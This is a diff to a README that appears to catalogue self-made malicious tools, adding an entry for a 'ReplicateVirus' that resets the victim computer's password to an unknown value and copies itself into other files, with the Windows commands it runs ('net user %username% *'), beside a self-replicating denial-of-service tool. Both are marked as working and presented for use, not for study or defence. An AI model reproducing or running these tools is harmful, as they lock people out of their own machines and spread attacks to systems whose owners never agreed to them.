@@ -32,13 +32,27 @@
   
   Working : ✔
   
-## Auto_ReplicateDosTool
+## Auto_ReplicateDosTool 📈
 
 ### How is it working
   It Dos the Target, Then replicate into an other file an Dos the same Target.
   
   Working : ✔
   
+## ReplicateVirus 🔒
+
+### How is it working ?
+  It Change the Password of the Target Comptuer, Then replicate into an other file, The target will never know which password 
+  it is
+  
+  Command Shell,
+    
+     - echo %username%
+     
+     - net user %username% *
+     
+   Working : ✔
+   
 # Information
 
 ## Legal Information
